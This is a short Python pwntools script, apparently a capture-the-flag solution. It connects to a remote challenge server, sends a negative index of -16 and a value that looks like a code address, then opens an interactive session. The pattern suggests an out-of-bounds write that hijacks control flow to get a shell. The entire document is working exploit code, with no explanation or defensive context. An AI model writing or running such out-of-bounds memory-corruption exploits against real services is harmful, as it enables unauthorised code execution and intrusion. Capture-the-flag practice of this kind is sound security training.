from pwn import *

context.arch = 'amd64'
p = remote('ctf.adl.tw', 10008)
p.sendlineafter(b"Enter dimension index: ", b"-16")
p.sendlineafter(b"calibration frequency: ", b"4199051")
p.interactive()
